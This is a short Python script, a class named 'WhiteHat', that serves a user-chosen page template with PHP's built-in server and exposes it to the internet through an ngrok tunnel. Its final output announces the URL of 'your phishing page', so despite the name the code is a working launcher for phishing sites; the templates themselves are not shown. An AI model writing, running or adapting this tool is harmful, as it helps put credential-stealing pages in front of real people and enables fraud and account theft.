import os
import subprocess
import time
import requests
import json
from config import NGROK_PORT, TEMPLATE_DIR

class WhiteHat:
    def __init__(self):
        self.ngrok_url = None
        self.selected_template = None
        self.templates = self.load_templates()

    def load_templates(self):
        """Dynamically loads available templates."""
        template_dirs = [d for d in os.listdir(TEMPLATE_DIR) if os.path.isdir(os.path.join(TEMPLATE_DIR, d))]
        return template_dirs

    def select_template(self):
        """Allows user to choose a template to deploy."""
        print("[+] Available Templates:")
        for i, template in enumerate(self.templates):
            print(f"[{i}] {template}")
        
        choice = int(input("[>] Select a template: "))
        if 0 <= choice < len(self.templates):
            self.selected_template = self.templates[choice]
            print(f"[✓] Selected template: {self.selected_template}")
        else:
            print("[-] Invalid selection.")
            exit()

    def start_ngrok(self):
        """Starts Ngrok tunnel."""
        print("[+] Starting Ngrok tunnel...")
        subprocess.Popen(['ngrok', 'http', str(NGROK_PORT)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(5)
        self.fetch_ngrok_url()
    
    def fetch_ngrok_url(self):
        """Fetches public URL from Ngrok."""
        try:
            response = requests.get("http://127.0.0.1:4040/api/tunnels")
            tunnel_info = response.json()
            self.ngrok_url = tunnel_info['tunnels'][0]['public_url']
            print(f"[✓] Ngrok URL: {self.ngrok_url}")
        except requests.RequestException as e:
            print(f"[-] Failed to fetch Ngrok URL: {e}")
            exit()

    def start_server(self):
        """Starts the PHP web server for the selected template."""
        if not self.selected_template:
            print("[-] No template selected.")
            exit()

        template_path = os.path.join(TEMPLATE_DIR, self.selected_template)
        print(f"[+] Hosting {self.selected_template} on port {NGROK_PORT}...")
        subprocess.Popen(['php', '-S', f'0.0.0.0:{NGROK_PORT}', '-t', template_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(3)
        print("[✓] Web server started successfully.")

    def run(self):
        self.select_template()
        self.start_ngrok()
        self.start_server()
        print(f"[+] Ready! Access your phishing page at: {self.ngrok_url}")

if __name__ == "__main__":
    tool = WhiteHat()
    tool.run()
